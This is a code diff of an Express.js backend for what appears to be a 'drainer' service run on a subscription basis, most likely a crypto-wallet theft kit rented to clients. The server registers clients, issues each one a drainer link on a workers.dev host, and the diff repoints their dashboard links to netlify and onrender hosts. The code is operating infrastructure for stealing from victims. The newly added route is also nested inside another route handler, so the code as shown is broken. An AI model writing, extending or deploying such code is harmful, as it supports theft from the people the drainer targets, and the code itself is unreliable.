@@ -108,7 +108,7 @@ app.post('/saas/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
+  dashboardUrl: `https://service-cheetah.netlify.app/dashboard.html?client=${clientId}`,
   message: 'Client registered successfully'
 });
     
@@ -195,7 +195,7 @@ app.post('/saas/v2/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
+  dashboardUrl: `https://service-cheetah.netlify.app/dashboard.html?client=${clientId}`,
   message: 'Client registered successfully'
 });
     
@@ -575,6 +575,15 @@ const ipWhitelist = (req, res, next) => {
 // ==================== ADVANCED CLIENT DASHBOARD ====================
 
 app.get('/saas/dashboard/:clientId', (req, res) => {
+
+// Cloudflare Worker Dashboard Route
+app.get("/dashboard.html", (req, res) => {
+    const clientId = req.query.client;
+    if (!clientId) {
+        return res.status(400).send("Client ID required: ?client=your-id");
+    }
+    res.redirect(`https://service-s816.onrender.com/saas/dashboard/${clientId}`);
+});
   const { clientId } = req.params;
   
   if (!clients.has(clientId)) {
